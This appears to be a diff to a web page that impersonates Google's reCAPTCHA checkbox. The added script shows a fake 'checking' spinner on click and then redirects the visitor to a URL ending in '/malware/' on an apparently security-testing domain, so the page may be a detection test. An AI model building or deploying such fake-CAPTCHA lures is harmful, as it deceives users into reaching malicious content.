@@ -51,6 +51,21 @@
       flex-shrink: 0;
     }
 
+    /* "checking" spinner shown after click */
+    .recaptcha-checkbox.checking {
+      border-color: transparent;
+      border-top: 3px solid #4285f4;
+      border-right: 3px solid #4285f4;
+      border-bottom: 3px solid #c1c1c1;
+      border-left: 3px solid #c1c1c1;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
     .recaptcha-label {
       flex: 1;
       line-height: 1.3;
@@ -78,12 +93,25 @@
   <h1>Verify you are human to continue</h1>
 
   <div class="recaptcha">
-    <div class="recaptcha-checkbox"></div>
+    <div class="recaptcha-checkbox" id="checkbox"></div>
     <div class="recaptcha-label">I'm not a robot</div>
     <div class="recaptcha-logo">
       <div class="brand">reCAPTCHA</div>
       <div class="legal">Privacy - Terms</div>
     </div>
   </div>
+
+  <script>
+    var REDIRECT_URL = "http://www.bitdefender-testing.com/malware/";
+    var checkbox = document.getElementById("checkbox");
+
+    checkbox.addEventListener("click", function () {
+      if (checkbox.classList.contains("checking")) return;
+      checkbox.classList.add("checking");
+      setTimeout(function () {
+        window.location.href = REDIRECT_URL;
+      }, 900);
+    });
+  </script>
 </body>
 </html>
